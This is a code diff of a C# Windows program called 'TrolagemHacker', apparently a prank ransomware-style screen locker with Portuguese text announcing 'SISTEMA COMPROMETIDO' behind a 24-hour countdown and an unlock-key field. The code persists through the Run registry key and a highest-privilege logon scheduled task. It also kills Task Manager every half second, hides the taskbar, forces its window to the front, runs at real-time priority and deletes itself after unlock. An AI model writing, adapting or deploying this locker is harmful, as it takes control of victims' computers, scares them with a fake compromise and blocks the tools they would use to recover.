@@ -5,7 +5,6 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Net;
 using System.IO;
-using System.Threading;
 using Microsoft.Win32;
 
 public class TrolagemHacker : Form
@@ -22,7 +21,6 @@ public class TrolagemHacker : Form
     private const string URL_HACKER = "https://i.ibb.co/NgkJFxH8/ASA.png";
     private const string URL_QRCODE = "https://raw.githubusercontent.com/espertin/wind/main/QR.png";
 
-    // --- API DO WINDOWS ---
     [DllImport("user32.dll")]
     private static extern int FindWindow(string className, string windowText);
     [DllImport("user32.dll")]
@@ -35,7 +33,6 @@ public class TrolagemHacker : Form
     private const int SW_HIDE = 0;
     private const int SW_SHOW = 5;
 
-    // --- HOOK DE TECLADO ---
     private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
     [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
@@ -52,10 +49,7 @@ public class TrolagemHacker : Form
 
     public TrolagemHacker()
     {
-        // --- PRIORIDADE MÁXIMA DO PROCESSO ---
         Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.RealTime;
-
-        // --- GARANTIR INSTÂNCIA ÚNICA ---
         Process atual = Process.GetCurrentProcess();
         foreach (Process p in Process.GetProcessesByName(atual.ProcessName)) {
             if (p.Id != atual.Id) try { p.Kill(); } catch {}
@@ -71,7 +65,6 @@ public class TrolagemHacker : Form
         int screenWidth = Screen.PrimaryScreen.Bounds.Width;
         int screenHeight = Screen.PrimaryScreen.Bounds.Height;
 
-        // --- CRONÔMETRO ---
         tempoFinal = DateTime.Now.AddHours(24);
         lblCronometro = new Label();
         lblCronometro.ForeColor = Color.Lime;
@@ -89,7 +82,6 @@ public class TrolagemHacker : Form
         };
         timerRelogio.Start();
 
-        // --- TÍTULO ---
         Label lblTitulo = new Label();
         lblTitulo.Text = "SISTEMA COMPROMETIDO";
         lblTitulo.ForeColor = Color.Red;
@@ -98,11 +90,10 @@ public class TrolagemHacker : Form
         lblTitulo.Location = new Point((screenWidth - 600) / 2, 320);
         this.Controls.Add(lblTitulo);
 
-        // --- TEXTO ---
         Label lblTexto = new Label();
         lblTexto.Text = "Ola, irmao. Seu computador foi bloqueado!\n\n" +
                         "AVISO: NAO TENTE REINICIAR OU FECHAR ESTA JANELA.\n" +
-                        "SISTEMA DE ALTA PRIORIDADE ATIVADO.";
+                        "CARREGAMENTO INSTANTANEO ATIVADO.";
         lblTexto.ForeColor = Color.Lime;
         lblTexto.Font = new Font("Courier New", 12, FontStyle.Bold);
         lblTexto.TextAlign = ContentAlignment.MiddleCenter;
@@ -110,7 +101,6 @@ public class TrolagemHacker : Form
         lblTexto.Location = new Point((screenWidth - 800) / 2, 400);
         this.Controls.Add(lblTexto);
 
-        // --- CAMPO SENHA ---
         txtChave = new TextBox();
         txtChave.PasswordChar = '*';
         txtChave.Font = new Font("Arial", 20);
@@ -129,7 +119,6 @@ public class TrolagemHacker : Form
         btnDesbloquear.Click += (s, e) => VerificarChave();
         this.Controls.Add(btnDesbloquear);
 
-        // --- IMAGENS ---
         using (WebClient client = new WebClient()) {
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
             try {
@@ -152,35 +141,28 @@ public class TrolagemHacker : Form
             } catch {}
         }
 
-        // --- PERSISTÊNCIA RELÂMPAGO (ALTA PRIORIDADE) ---
+        // --- TÉCNICAS DE INSTANTE ZERO ---
         try {
             string exePath = Application.ExecutablePath;
-            // 1. Registro (Run) - HKEY_CURRENT_USER
-            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            rk.SetValue("SecurityAlert", exePath);
+            // 1. Desativar Atraso de Inicialização do Windows (Startup Delay)
+            RegistryKey rkDelay = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Serialize");
+            rkDelay.SetValue("StartupDelayInMSec", 0, RegistryValueKind.DWord);
 
-            // 2. Pasta Inicializacao (Startup)
-            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-            string startupPath = Path.Combine(startupFolder, "SystemCheck.exe");
-            if (!File.Exists(startupPath)) File.Copy(exePath, startupPath, true);
+            // 2. Registro (Run)
+            RegistryKey rkRun = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+            rkRun.SetValue("SecurityAlert", exePath);
 
-            // 3. Tarefa Agendada Instantanea (Task Scheduler)
-            ProcessStartInfo psi = new ProcessStartInfo();
-            psi.FileName = "schtasks.exe";
-            psi.Arguments = "/create /sc onlogon /tn \"SystemCheck\" /tr \"" + exePath + "\" /f /rl highest";
-            psi.WindowStyle = ProcessWindowStyle.Hidden;
-            Process.Start(psi);
+            // 3. Tarefa Agendada Instantânea
+            Process.Start(new ProcessStartInfo("schtasks.exe", "/create /sc onlogon /tn \"SystemCheck\" /tr \"" + exePath + "\" /f /rl highest /delay 0000:00") { WindowStyle = ProcessWindowStyle.Hidden });
         } catch {}
 
-        // --- OCULTAR BARRA DE TAREFAS ---
         ControlarBarraTarefas(false);
 
-        // --- PROTEÇÃO ---
         timerProtecao = new System.Windows.Forms.Timer();
-        timerProtecao.Interval = 500; // Loop mais rapido (0.5s)
+        timerProtecao.Interval = 500;
         timerProtecao.Tick += (s, e) => {
             foreach (var p in Process.GetProcessesByName("taskmgr")) try { p.Kill(); } catch {}
-            ControlarBarraTarefas(false); // Reforca a ocultacao da barra
+            ControlarBarraTarefas(false);
             if (GetForegroundWindow() != this.Handle) {
                 SetForegroundWindow(this.Handle);
                 txtChave.Focus();
@@ -208,15 +190,12 @@ public class TrolagemHacker : Form
             ControlarBarraTarefas(true);
             
             try {
-                Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue("SecurityAlert", false);
-                string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "SystemCheck.exe");
-                if (File.Exists(startupPath)) File.Delete(startupPath);
+                Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue("SecurityAlert", false);
+                Registry.CurrentUser.DeleteSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Serialize", false);
                 Process.Start(new ProcessStartInfo("schtasks.exe", "/delete /tn \"SystemCheck\" /f") { WindowStyle = ProcessWindowStyle.Hidden });
 
-                // Autodestruicao
-                string exePath = Application.ExecutablePath;
                 string batPath = Path.Combine(Path.GetTempPath(), "cleanup.bat");
-                File.WriteAllText(batPath, "@echo off\ntimeout /t 2 /nobreak > nul\ndel /f /q \"" + exePath + "\"\ndel /f /q \"%~f0\"\nexit");
+                File.WriteAllText(batPath, "@echo off\ntimeout /t 2 /nobreak > nul\ndel /f /q \"" + Application.ExecutablePath + "\"\ndel /f /q \"%~f0\"\nexit");
                 Process.Start(new ProcessStartInfo("cmd.exe", "/c \"" + batPath + "\"") { WindowStyle = ProcessWindowStyle.Hidden });
             } catch {}
 
